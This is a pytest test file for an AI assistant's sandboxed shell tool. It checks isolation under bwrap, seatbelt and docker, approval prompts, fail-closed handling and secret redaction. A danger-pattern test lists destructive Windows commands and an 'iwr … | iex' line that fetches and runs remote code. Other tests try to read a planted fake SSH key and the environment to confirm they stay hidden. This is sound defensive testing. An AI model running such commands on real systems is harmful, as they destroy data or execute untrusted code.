"""Sandbox wrappers, approval text, fail-closed behaviour, and a real bwrap run."""

import asyncio
import os
import shutil
import subprocess
import sys
from pathlib import Path
from types import SimpleNamespace

import pytest

from micropaw.config import PermissionsConfig
from micropaw.tools import sandbox, shell
from micropaw.tools.base import ToolContext
from micropaw.tools.sandbox import Sandbox
from micropaw.utils import redact


@pytest.fixture(autouse=True)
def _fresh(monkeypatch):
    monkeypatch.setattr(sandbox, "_config", None)
    monkeypatch.setattr(sandbox, "_probes", {})
    monkeypatch.setattr(sandbox, "_broken", set())
    monkeypatch.setattr(sandbox, "_pulled", set())
    redact.set_known_secrets({})


def _cfg(**kw):
    sandbox.configure(PermissionsConfig(**kw))


def _ctx(ws="", **kw):
    return ToolContext(conversation_id="c", user_id="u", platform="t", allow_shell=True, workspace=str(ws), **kw)


def _bwrap_works() -> bool:
    if not sys.platform.startswith("linux"):
        return False
    _cfg(sandbox="bwrap")
    return sandbox.resolve().active


needs_bwrap = pytest.mark.skipif(not _bwrap_works(), reason="bwrap missing or user namespaces blocked")
sandbox._config = None
sandbox._probes.clear()


# --- resolution -------------------------------------------------------------

def test_defaults():
    p = PermissionsConfig()
    assert (p.sandbox, p.sandbox_network, p.sandbox_image) == ("auto", False, "python:3.13-slim")


def test_off_means_host():
    _cfg(sandbox="off")
    assert sandbox.resolve() == Sandbox("none")


def test_auto_never_picks_docker(monkeypatch):
    asked = []
    monkeypatch.setattr(sandbox, "_available", lambda kind: asked.append(kind) or kind in ("docker", "podman"))
    _cfg(sandbox="auto")
    assert sandbox.resolve().kind == "none"
    assert set(asked) <= {"bwrap", "seatbelt"}


def test_auto_prefers_bwrap(monkeypatch):
    monkeypatch.setattr(sandbox, "_available", lambda kind: True)
    _cfg(sandbox="auto", sandbox_network=True)
    assert sandbox.resolve() == Sandbox("bwrap", True)


def test_explicit_but_missing_is_an_error(monkeypatch):
    monkeypatch.setattr(sandbox, "_available", lambda kind: False)
    _cfg(sandbox="podman")
    sb = sandbox.resolve()
    assert sb.error and not sb.active


def test_docker_refused_inside_container_with_socket(monkeypatch):
    monkeypatch.setattr(sandbox, "_available", lambda kind: True)
    monkeypatch.setattr(Path, "exists", lambda self: self.as_posix() in ("/.dockerenv", "/var/run/docker.sock"))
    _cfg(sandbox="docker")
    assert "Docker socket" in sandbox.resolve().error


def test_probe_runs_once(monkeypatch):
    calls = []
    monkeypatch.setattr(sandbox.shutil, "which", lambda n: "/x/" + n)
    monkeypatch.setattr(sandbox, "_run", lambda argv, timeout=0: calls.append(argv) or True)
    _cfg(sandbox="docker")
    for _ in range(3):
        assert sandbox.resolve().kind == "docker"
    assert len(calls) == 1


def test_mark_failed_stops_use(monkeypatch):
    monkeypatch.setattr(sandbox, "_available", sandbox._available)
    sandbox._probes["bwrap"] = True
    _cfg(sandbox="auto")
    sandbox._probes["bwrap"] = True
    assert sandbox.resolve().kind == "bwrap"
    sandbox.mark_failed("bwrap")
    assert sandbox.resolve().kind != "bwrap"


@needs_bwrap
def test_probe_is_quick():
    sandbox._probes.clear()
    import time
    start = time.perf_counter()
    assert sandbox.resolve().kind == "bwrap"
    assert time.perf_counter() - start < 0.5  # about 15 ms here; the cap is 200 ms per probe


# --- argv and profile text ---------------------------------------------------

def _argv(network=False, **kw):
    ws = Path("/tmp/ws-test")
    ws.mkdir(exist_ok=True)
    env = {"PATH": "/usr/bin", "HOME": "/home/x", "ANTHROPIC_API_KEY": "nope", "LANG": "C", "FOO": "bar"}
    return sandbox.wrap(Sandbox("bwrap", network), "echo hi", ws, env, **kw).argv


def test_bwrap_argv_has_no_root_bind_and_hides_sockets():
    a = _argv()
    assert not any(a[i:i + 3] == ["--ro-bind", "/", "/"] for i in range(len(a)))
    for hidden in ("/run", "/home", "/root", "/var", "/tmp"):
        assert ["--tmpfs", hidden] in [a[i:i + 2] for i in range(len(a))]
    assert "--unshare-all" in a and "--share-net" not in a
    assert "--die-with-parent" in a and "--new-session" in a
    assert a[-4:] == ["--", "/bin/sh", "-c", "echo hi"] or a[-3:] == ["/bin/sh", "-c", "echo hi"]


def test_bwrap_env_is_an_allow_list():
    a = _argv()
    sets = {a[i + 1]: a[i + 2] for i in range(len(a)) if a[i] == "--setenv"}
    assert set(sets) == {"HOME", "PATH", "LANG"}
    assert sets["HOME"] == str(Path("/tmp/ws-test").resolve())
    assert "--clearenv" in a


def test_bwrap_share_net_only_when_allowed():
    assert "--share-net" in _argv(network=True)


@pytest.mark.parametrize("ws", ["/", str(Path.home()), str(Path.home().parent)])
def test_wide_workspaces_are_refused(ws):
    with pytest.raises(sandbox.SandboxError):
        sandbox.wrap(Sandbox("bwrap"), "true", Path(ws), {})


def test_workspace_containing_config_dir_is_refused(monkeypatch, tmp_path):
    monkeypatch.setattr(sandbox, "CONFIG_DIR", tmp_path / "ws" / ".micropaw")
    (tmp_path / "ws" / ".micropaw").mkdir(parents=True)
    with pytest.raises(sandbox.SandboxError):
        sandbox.wrap(Sandbox("bwrap"), "true", tmp_path / "ws", {}, home=tmp_path / "elsewhere")


@pytest.mark.skipif(os.name == "nt", reason="the profile refuses backslash paths; seatbelt only runs on macOS")
def test_seatbelt_profile_text():
    home = Path("/Users/me")
    off = sandbox.seatbelt_profile(Sandbox("seatbelt"), Path("/Users/me/work"), home)
    assert "(deny network*)" in off and "(allow network*)" not in off
    assert '(allow file-write* (subpath "/Users/me/work") (subpath "/private/tmp")' in off
    assert '(deny file-read* (subpath "/Users/me")' in off
    assert '(allow file-read* (subpath "/Users/me/work") (subpath "/Users/me/.local/bin")' in off
    assert off.index("(deny file-read*") < off.index("(allow file-read*")  # later rules win
    on = sandbox.seatbelt_profile(Sandbox("seatbelt", True), Path("/Users/me/work"), home)
    assert "(allow network*)" in on and "(deny network*)" not in on


def test_seatbelt_rejects_quote_in_path():
    with pytest.raises(sandbox.SandboxError):
        sandbox.seatbelt_profile(Sandbox("seatbelt"), Path('/Users/me/a"b'), Path("/Users/me"))


@pytest.mark.skipif(os.name == "nt", reason="the profile refuses backslash paths; seatbelt only runs on macOS")
def test_seatbelt_wrapped_argv():
    w = sandbox.wrap(Sandbox("seatbelt"), "ls", Path("/tmp/ws-test"), {"A": "b"}, home=Path("/Users/me"))
    assert w.argv[:2] == ["sandbox-exec", "-p"] and w.argv[-3:] == ["/bin/sh", "-c", "ls"]
    assert w.env == {"A": "b"}


@pytest.mark.parametrize("kind", ["docker", "podman"])
def test_container_argv(kind):
    w = sandbox.wrap(Sandbox(kind, False, "python:3.13-slim"), "ls", Path("/tmp/ws-test"), {"SECRET_KEY": "x"})
    a = w.argv
    assert a[:3] == [kind, "run", "--rm"]
    for flag in ("--read-only", "--cap-drop", "--pids-limit", "--memory", "--tmpfs"):
        assert flag in a
    assert a[a.index("--network") + 1] == "none"
    assert a[a.index("--security-opt") + 1] == "no-new-privileges"
    mount = a[a.index("--mount") + 1]
    assert mount == f"type=bind,src={Path('/tmp/ws-test').resolve()},dst=/work"
    assert "-v" not in a and "SECRET_KEY" not in " ".join(a)
    assert a[-4:] == ["python:3.13-slim", "sh", "-c", "ls"]
    assert w.cleanup[:2] == [kind, "rm"]


def test_container_network_on():
    a = sandbox.wrap(Sandbox("docker", True, "img"), "ls", Path("/tmp/ws-test"), {}).argv
    assert a[a.index("--network") + 1] == "bridge"


def test_container_rejects_comma_in_workspace(tmp_path):
    d = tmp_path / "a,b"
    d.mkdir()
    with pytest.raises(sandbox.SandboxError):
        sandbox.wrap(Sandbox("docker", False, "img"), "ls", d, {})


# --- approval text and skipping ------------------------------------------------

def test_approval_text_names_the_place(monkeypatch, tmp_path):
    tool = shell.ShellTool()
    for sb, start in [
        (Sandbox("bwrap"), "In sandbox (no network):"),
        (Sandbox("bwrap", True), "In sandbox (network on):"),
        (Sandbox("none"), "On this computer:"),
    ]:
        monkeypatch.setattr(sandbox, "resolve", lambda sb=sb: sb)
        text = tool.needs_approval({"command": "ls"}, _ctx(tmp_path))
        assert text.startswith(start) and text.endswith("\nls")


def test_careful_warning_kept(monkeypatch):
    monkeypatch.setattr(sandbox, "resolve", lambda: Sandbox("bwrap"))
    text = shell.ShellTool().needs_approval({"command": "rm notes.txt"}, _ctx())
    assert text.startswith("In sandbox") and "Careful: this can delete or change things." in text


def test_skip_rules(monkeypatch):
    tool = shell.ShellTool()
    skip = {"confirm_dangerous": False}
    monkeypatch.setattr(sandbox, "resolve", lambda: Sandbox("bwrap"))
    assert tool.needs_approval({"command": "ls"}, _ctx(**skip)) is None
    assert tool.needs_approval({"command": "ls"}, _ctx(marked=True, **skip))
    monkeypatch.setattr(sandbox, "resolve", lambda: Sandbox("seatbelt"))
    assert tool.needs_approval({"command": "ls"}, _ctx(**skip))  # experimental: always asks
    monkeypatch.setattr(sandbox, "resolve", lambda: Sandbox("none"))
    # not os.name itself: pathlib would build WindowsPath
    monkeypatch.setattr(shell, "os", SimpleNamespace(**{**vars(os), "name": "nt"}))
    assert tool.needs_approval({"command": "ls"}, _ctx(**skip))  # Windows host: always asks
    monkeypatch.setattr(shell, "os", os)
    assert tool.needs_approval({"command": "ls"}, _ctx(**skip)) is None


def test_broken_explicit_sandbox_refuses(monkeypatch):
    monkeypatch.setattr(sandbox, "resolve", lambda: Sandbox("none", error="The bwrap sandbox is not available."))
    tool = shell.ShellTool()
    assert tool.needs_approval({"command": "ls"}, _ctx()) is None
    out = asyncio.run(tool.execute({"command": "ls"}, _ctx()))
    assert out.startswith("Error:") and out.endswith("Not run.")


# --- fail closed -----------------------------------------------------------------

@pytest.mark.skipif(os.name == "nt", reason="uses /bin/sh")
def test_sandbox_failure_is_not_rerun_on_host(monkeypatch, tmp_path):
    sandbox._probes["bwrap"] = True
    monkeypatch.setattr(sandbox, "resolve", lambda: Sandbox("bwrap") if sandbox._probes["bwrap"] else Sandbox("none"))
    monkeypatch.setattr(sandbox, "_available", lambda kind: False)  # the fresh probe fails too
    marker = tmp_path / "ran-on-host"
    monkeypatch.setattr(sandbox, "wrap", lambda *a, **k: sandbox.Wrapped(
        ["/bin/sh", "-c", "echo 'bwrap: No permissions to create new namespace' >&2; exit 1"], None))
    out = asyncio.run(shell.ShellTool().execute({"command": f"touch {marker}"}, _ctx(tmp_path)))
    assert out == "Sandbox failed: bwrap: No permissions to create new namespace. Not run."
    assert not marker.exists()
    assert sandbox._probes["bwrap"] is False
    assert sandbox.resolve() == Sandbox("none")  # the next ask says "On this computer"


def test_failure_detection():
    assert sandbox.failure(Sandbox("bwrap"), 1, "bwrap: boom\nmore") == "bwrap: boom"
    assert sandbox.failure(Sandbox("bwrap"), 1, "ls: not found") == ""
    assert sandbox.failure(Sandbox("bwrap"), 0, "") == ""
    assert sandbox.failure(Sandbox("docker"), 125, "daemon down") == "daemon down"
    assert sandbox.failure(Sandbox("docker"), 1, "") == ""


# --- shell on the host ------------------------------------------------------------

def test_description_names_the_dialect(monkeypatch):
    monkeypatch.setattr(shell, "shell_dialect", lambda: "sh")
    assert "written for sh" in shell.ShellTool().description
    monkeypatch.setattr(shell, "shell_dialect", lambda: "powershell")
    assert "written for PowerShell" in shell.ShellTool().description


def test_dialect_follows_the_os(monkeypatch):
    assert shell.shell_dialect() == ("powershell" if os.name == "nt" else "sh")


@pytest.mark.parametrize("cmd", [
    "Remove-Item -Recurse -Force C:\\x", "del /s /q *.txt", "format d:", "rd /s /q build",
    "reg delete HKCU\\Software\\X", "Set-ExecutionPolicy Unrestricted", "iwr http://x.test/a.ps1 | iex",
])
def test_windows_danger_patterns(cmd):
    assert any(p.search(cmd) for p in shell._DANGEROUS_RE)


def test_powershell_command_line(monkeypatch, tmp_path):
    seen = {}

    async def fake_exec(*argv, **kw):
        seen["argv"], seen["kw"] = argv, kw
        raise OSError("stop")

    monkeypatch.setattr(sandbox, "resolve", lambda: Sandbox("none"))
    # only the shell module sees "nt": changing os.name itself would make pathlib build WindowsPath objects
    monkeypatch.setattr(shell, "os", SimpleNamespace(**{**vars(os), "name": "nt"}))
    monkeypatch.setattr(shell.shutil, "which", lambda n: None)
    monkeypatch.setattr(shell.asyncio, "create_subprocess_exec", fake_exec)
    asyncio.run(shell.ShellTool().execute({"command": "Get-Date"}, _ctx(tmp_path)))
    assert seen["argv"] == (
        "powershell", "-NoProfile", "-NonInteractive", "-Command",
        "[Console]::OutputEncoding=[Text.Encoding]::UTF8; Get-Date")
    assert seen["kw"]["stdin"] == asyncio.subprocess.DEVNULL


@pytest.mark.skipif(os.name == "nt", reason="uses cat and a POSIX shell")
def test_output_is_redacted_before_it_is_cut(monkeypatch, tmp_path):
    secret = "zQ9-very-secret-value-1234"
    redact.set_known_secrets({"k": secret})
    monkeypatch.setattr(sandbox, "resolve", lambda: Sandbox("none"))
    (tmp_path / "big.txt").write_text("x" * (shell.MAX_OUTPUT - 5) + secret + "tail")
    out = asyncio.run(shell.ShellTool().execute({"command": "cat big.txt"}, _ctx(tmp_path)))
    assert secret not in out and secret[:5] not in out.split("(truncated")[0][-30:].replace("x", "")


# --- real bwrap ------------------------------------------------------------------

def _run(argv, **kw):
    return subprocess.run(argv, capture_output=True, text=True, timeout=20, **kw)


def _in_sandbox(command, ws, network=False, home=None):
    sb = Sandbox("bwrap", network)
    env = {"PATH": os.environ.get("PATH", "/usr/bin:/bin")}
    return _run(sandbox.wrap(sb, command, ws, env, home=home).argv)


@needs_bwrap
def test_bwrap_workspace_writable_and_outside_is_not(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    r = _in_sandbox("echo hi > inside.txt && cat inside.txt", ws)
    assert r.returncode == 0 and r.stdout.strip() == "hi"
    assert (ws / "inside.txt").read_text().strip() == "hi"  # visible on the host
    outside = tmp_path / "outside.txt"
    outside.write_text("keep")
    for target in ("/usr/bin/sh", "/etc/hostname", "/usr/micropaw-test"):
        assert _in_sandbox(f"echo changed > {target}", ws).returncode != 0
    _in_sandbox(f"echo changed > {outside}", ws)  # /tmp is private, so only a copy changes
    assert outside.read_text() == "keep"


@needs_bwrap
def test_bwrap_secret_dirs_hidden(tmp_path):
    fake_home = Path.home() / f".mp_sandbox_test_{os.getpid()}"
    try:
        (fake_home / ".ssh").mkdir(parents=True)
        (fake_home / ".ssh" / "id_rsa").write_text("PRIVATE")
        (fake_home / ".micropaw").mkdir()
        (fake_home / ".micropaw" / "config.json").write_text("{}")
        ws = tmp_path / "ws"
        ws.mkdir()
        r = _in_sandbox(f"ls -A {fake_home}; cat {fake_home}/.ssh/id_rsa; ls {fake_home}/.micropaw; "
                        f"test ! -e {Path.home() / '.ssh'} && test ! -e {Path.home() / '.micropaw'} && echo hidden", ws)
        assert "PRIVATE" not in r.stdout and "id_rsa" not in r.stdout and "config.json" not in r.stdout
        assert r.stdout.strip() == "hidden" and r.stderr.count("No such file") == 3
    finally:
        shutil.rmtree(fake_home, ignore_errors=True)


@needs_bwrap
def test_bwrap_real_home_run_and_socket_dirs_not_visible(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    r = _in_sandbox("ls -A ~; echo ---; ls -A /run /home /root /var; echo ---; ls /run/user /var/run/docker.sock "
                    "/run/docker.sock 2>&1", ws)
    listing, _, rest = r.stdout.partition("---")
    assert listing.strip() == ""  # ~ is the workspace, which is empty
    middle, _, errors = rest.partition("---")
    assert middle.replace("/run:", "").replace("/home:", "").replace("/root:", "").replace("/var:", "").strip() == ""
    assert errors.count("No such file") == 3


@needs_bwrap
def test_bwrap_network_off_by_default_and_on_when_allowed(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    probe = ("import socket;s=socket.socket();s.settimeout(3)\n"
             "try:\n s.connect(('1.1.1.1',53));print('connected')\nexcept OSError as e:\n print('failed',e.errno)\n")
    if not shutil.which("python3"):
        pytest.skip("python3 not on PATH")
    (ws / "net.py").write_text(probe)
    off = _in_sandbox("python3 net.py", ws)
    assert off.stdout.startswith("failed")
    # interfaces: only lo without network, the host's with it
    def ifaces(net):
        out = _in_sandbox("cat /proc/net/dev", ws, network=net).stdout.splitlines()[2:]
        return sorted(line.split(":")[0].strip() for line in out)

    assert ifaces(False) == ["lo"]
    host = sorted(line.split(":")[0].strip() for line in Path("/proc/net/dev").read_text().splitlines()[2:])
    assert ifaces(True) == host


@needs_bwrap
def test_bwrap_does_not_see_micropaw_secrets(monkeypatch, tmp_path):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-should-not-leak-12345")
    monkeypatch.setenv("SOME_OTHER_VAR", "visible-on-host")
    ws = tmp_path / "ws"
    ws.mkdir()
    sb = Sandbox("bwrap")
    r = _run(sandbox.wrap(sb, "env", ws, shell._child_env()).argv)
    assert "sk-should-not-leak" not in r.stdout and "SOME_OTHER_VAR" not in r.stdout


@needs_bwrap
def test_shell_tool_end_to_end(tmp_path):
    _cfg(sandbox="bwrap")
    ws = tmp_path / "ws"
    out = asyncio.run(shell.ShellTool().execute({"command": "echo made > f.txt && ls"}, _ctx(ws)))
    assert out == "f.txt"
    assert (ws / "f.txt").exists()
    out = asyncio.run(shell.ShellTool().execute({"command": "touch /usr/nope"}, _ctx(ws)))
    assert out.startswith("Exit code")


# --- docker, only when a daemon answers ---------------------------------------------

def _docker_ready() -> bool:
    if not shutil.which("docker"):
        return False
    try:
        if subprocess.run(["docker", "info"], capture_output=True, timeout=5).returncode:
            return False
        return subprocess.run(["docker", "image", "inspect", "python:3.13-slim"],
                              capture_output=True, timeout=5).returncode == 0
    except (OSError, subprocess.SubprocessError):
        return False


@pytest.mark.skipif(not _docker_ready(), reason="docker daemon or python:3.13-slim image not available")
def test_docker_runs_command_with_only_workspace(tmp_path):
    w = sandbox.wrap(Sandbox("docker", False, "python:3.13-slim"), "echo hi > f && ls /work && ls /root", tmp_path, {})
    r = _run(w.argv)
    assert "f" in r.stdout and (tmp_path / "f").exists()


# --- probe, auto without a sandbox, and a command that fakes a failure ---------------

def test_probe_timeout_allows_a_slow_cold_start():
    assert sandbox.PROBE_TIMEOUT >= 3.0


def test_auto_without_a_sandbox_always_asks_on_posix(monkeypatch):
    monkeypatch.setattr(sandbox, "_available", lambda kind: False)
    _cfg(sandbox="auto")
    sb = sandbox.resolve()
    assert sb.kind == "none" and sb.host_asks and not sb.error
    monkeypatch.setattr(shell, "os", os)
    assert shell.ShellTool().needs_approval({"command": "ls"}, _ctx(confirm_dangerous=False))
    _cfg(sandbox="off")  # the owner chose "off": the old rule still applies
    assert shell.ShellTool().needs_approval({"command": "ls"}, _ctx(confirm_dangerous=False)) is None


def test_auto_after_a_real_failure_refuses_instead_of_using_the_host(monkeypatch):
    monkeypatch.setattr(sandbox, "_available", lambda kind: kind == "bwrap")
    _cfg(sandbox="auto")
    assert sandbox.resolve().kind == "bwrap"
    sandbox.mark_failed("bwrap")
    sb = sandbox.resolve()
    assert sb.kind == "none" and "stopped working" in sb.error
    out = asyncio.run(shell.ShellTool().execute({"command": "ls"}, _ctx()))
    assert out.startswith("Error:") and out.endswith("Not run.")
    _cfg(sandbox="auto")  # a new setting clears it
    assert sandbox.resolve().kind == "bwrap"


@pytest.mark.skipif(os.name == "nt", reason="uses /bin/sh")
def test_command_cannot_switch_the_sandbox_off_by_printing_bwrap(monkeypatch, tmp_path):
    monkeypatch.setattr(sandbox, "_available", lambda kind: kind == "bwrap")  # the probe still passes
    _cfg(sandbox="auto")
    assert sandbox.resolve().kind == "bwrap"
    monkeypatch.setattr(sandbox, "wrap", lambda *a, **k: sandbox.Wrapped(
        ["/bin/sh", "-c", "echo 'bwrap: injected' >&2; exit 3"], None))
    out = asyncio.run(shell.ShellTool().execute({"command": "x"}, _ctx(tmp_path)))
    assert "injected" in out and "Sandbox failed" not in out
    assert sandbox.resolve().kind == "bwrap"


async def test_gateway_start_probes_and_warns_when_no_sandbox(monkeypatch, tmp_path, caplog):
    from unittest.mock import MagicMock

    from micropaw import gateway as gw_mod
    from micropaw.config import Config

    monkeypatch.setattr(gw_mod, "DB_FILE", tmp_path / "d.db")
    monkeypatch.setattr(gw_mod, "CONFIG_DIR", tmp_path)
    monkeypatch.setattr(sandbox, "_available", lambda kind: False)
    monkeypatch.setattr(gw_mod.sys, "platform", "linux")
    monkeypatch.setattr("micropaw.scheduler.Scheduler.run", lambda self: asyncio.sleep(0))
    c = Config()
    c.embedding.enabled = "false"
    class Terminal:
        name = "terminal"

        def set_handler(self, h): pass
        def set_stream_handler(self, h): pass
        def set_access(self, h): pass

        async def start(self): pass
        async def stop(self): pass

    gw = gw_mod.Gateway(c, MagicMock(), MagicMock(), [Terminal()])
    with caplog.at_level("WARNING"):
        await gw.start()
    assert "No sandbox found; shell commands run on this computer and always ask." in caplog.text


@pytest.mark.skipif(os.name == "nt", reason="uses /bin/sh")
def test_shell_has_no_stdin_and_a_timeout_kills_the_children(monkeypatch, tmp_path):
    seen = {}
    real = asyncio.create_subprocess_shell

    async def spy(*a, **kw):
        seen.update(kw)
        return await real(*a, **kw)

    monkeypatch.setattr(sandbox, "resolve", lambda: Sandbox("none"))
    monkeypatch.setattr(shell.asyncio, "create_subprocess_shell", spy)
    monkeypatch.setattr(shell, "TIMEOUT", 1)
    out = asyncio.run(shell.ShellTool().execute(
        {"command": "sleep 300 & echo $! > child.pid; wait"}, _ctx(tmp_path)))
    assert "timed out" in out
    assert seen["stdin"] == asyncio.subprocess.DEVNULL and seen["start_new_session"] is True
    pid = int((tmp_path / "child.pid").read_text())
    import time
    for _ in range(20):
        try:
            os.kill(pid, 0)
        except ProcessLookupError:
            break
        time.sleep(0.1)
    with pytest.raises(ProcessLookupError):
        os.kill(pid, 0)


@pytest.mark.skipif(os.name == "nt", reason="uses /bin/sh")
def test_a_command_that_reads_stdin_does_not_wait(monkeypatch, tmp_path):
    monkeypatch.setattr(sandbox, "resolve", lambda: Sandbox("none"))
    out = asyncio.run(shell.ShellTool().execute({"command": "cat; echo after"}, _ctx(tmp_path)))
    assert out == "after"


def test_windows_timeout_uses_taskkill(monkeypatch):
    calls = []

    class Proc:
        pid = 4242

        def kill(self):
            calls.append("kill")

        async def wait(self):
            return 0

    class Killer:
        async def wait(self):
            return 0

    async def fake_exec(*argv, **kw):
        calls.append(argv)
        return Killer()

    monkeypatch.setattr(shell, "os", SimpleNamespace(**{**vars(os), "name": "nt"}))
    monkeypatch.setattr(shell.asyncio, "create_subprocess_exec", fake_exec)
    asyncio.run(shell._kill_tree(Proc()))
    assert calls[0] == ("taskkill", "/T", "/F", "/PID", "4242") and calls[1] == "kill"
